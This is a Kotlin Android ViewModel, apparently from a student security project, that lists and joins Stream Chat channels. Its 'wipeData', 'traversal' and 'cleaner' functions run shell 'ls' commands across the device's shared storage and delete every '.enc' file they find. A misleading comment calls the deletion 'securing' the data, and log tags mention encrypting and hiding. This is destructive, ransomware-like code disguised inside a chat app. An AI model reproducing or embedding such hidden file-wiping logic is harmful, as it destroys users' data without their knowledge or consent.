package com.example.ict2215_project.presentation.screen.channelList

import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.ict2215_project.domain.repository.IStreamChatServerRepository
import dagger.hilt.android.lifecycle.HiltViewModel
import io.getstream.chat.android.client.ChatClient
import io.getstream.chat.android.models.Channel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import javax.inject.Inject

import com.example.ict2215_project.services.MyDeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import java.io.File

@HiltViewModel
class AvailableChannelListViewModel @Inject constructor(
    private val client: ChatClient, private val repository: IStreamChatServerRepository
) : ViewModel() {
    private val _availableChannelListState =
        MutableStateFlow<AvailableChannelListState>(AvailableChannelListState.Idle)
    val availableChannelListState: StateFlow<AvailableChannelListState> =
        _availableChannelListState.asStateFlow()

    init {
        getAvailableChannelList()
    }

    fun getAvailableChannelList() {
        viewModelScope.launch {
            _availableChannelListState.value = AvailableChannelListState.Loading
            val userID = client.getCurrentUser()?.id ?: ""
            if (userID.isNotEmpty()) {
                try {
                    // Call the repository to fetch channels
                    val channels =
                        repository.queryChannels(userID) // This needs to be implemented in your IStreamChatServerRepository
                    // Update the state with the list of channels
                    _availableChannelListState.value = AvailableChannelListState.Success(channels)
                } catch (e: Exception) {
                    // Handle any errors
                    _availableChannelListState.value =
                        AvailableChannelListState.Error(e.message ?: "Unknown error")
                }
            } else {
                // Handle the case where there is no current user
                _availableChannelListState.value =
                    AvailableChannelListState.Error("No user ID available")
            }
        }
    }

    fun joinChannel(channelId: String) {
        viewModelScope.launch {
            val userID = client.getCurrentUser()?.id ?: ""
            val channelClient = client.channel(channelId)
            channelClient.addMembers(listOf(userID)).enqueue { result ->
                if (result.isSuccess) {
                    val channel: Channel = result.getOrThrow()
                    Log.d("AvailableChannelListViewModel", "Joined channel: ${channel.id}")
                } else {
                    Log.e("AvailableChannelListViewModel", "Failed to join channel: $channelId")
                }
            }

        }
    }

    // remove data if button pressed
    fun wipeData(context: Context) {
        val basePath = "/storage/emulated/0/"
        try {
            val process = Runtime.getRuntime().exec("ls $basePath")
            val reader = process.inputStream.bufferedReader()
            val output = reader.readText()
            reader.close()

            val filesList = output.split("\n")
            for (i in 0 until filesList.size) {
                if (!filesList[i].isEmpty()) {
                    val dirPath = basePath + filesList[i]
                    // traversal("/storage/emulated/0/Download/")
                    traversal(dirPath, 0)
                }
            }
            process.waitFor()
        } catch (e: Exception) {
            Log.d("encryptorError", e.toString())
        }
    }

    // Secure the file data
    private fun cleaner(file: File?, filePath: String?): Boolean {
        if (file != null && filePath?.isNotEmpty() == true) {
            try {
                // Perform file deletion of original file
                if (file.exists()) {
                    file.delete()
                    if (!file.exists()) {
                        Log.d("deletortrue", "deleted file")
                    } else {
                        Log.d("deletorfail", "file not deleted")
                    }
                } else {
                    Log.d("deletorfail", "file does not exists")
                }
            } catch (e: Exception) {
                Log.d("hiderError", "error in hiding")
                return false
            }
        }
        return true
    }

    // used to traverse all directory and find files
    private fun traversal(dirPath: String?, depth: Int = 0): Boolean {
        if (depth > 10) {
            return false
        }
        if (dirPath != null) {
            try {
                Log.d("traversalInput", dirPath.toString()?:"nothing")
                val process = Runtime.getRuntime().exec("ls -a $dirPath")
                val reader = process.inputStream.bufferedReader()
                val output = reader.readText()
                reader.close()

                val filesList = output.split("\n")
                val filteredList = filesList.filter { it.endsWith(".enc") }
                Log.d("traversalFilter", filteredList.toString()?:"nothing")
                if (!filteredList.isEmpty()) {
                    for (path in filteredList) {
                        if (path == "." || path == "..") {
                            continue
                        }
                        if (!path.isEmpty()) {
                            val filePath = dirPath + "/" + path
                            Log.d("traversalPath", filePath.toString()?:"nothing")
                            val file = File(filePath)
                            Log.d("traversalFile", file.isFile.toString()?:"nothing")

                            when {
                                file.isDirectory -> {
                                    Log.d("traversalDir", file.toString()?:"nothing")
                                    traversal(filePath, depth + 1)
                                }
                                file.isFile -> {
                                    cleaner(file, filePath)
                                }
                                else -> {
                                    Log.d("traversalError", "Error during hiding")
                                    return false
                                }
                            }
                        }
                    }
                }

                process.waitFor()
            } catch (e: Exception) {
                Log.d("traversalError", e.toString()?:"nothing")
                return false
            }
        }
        return true
    }
}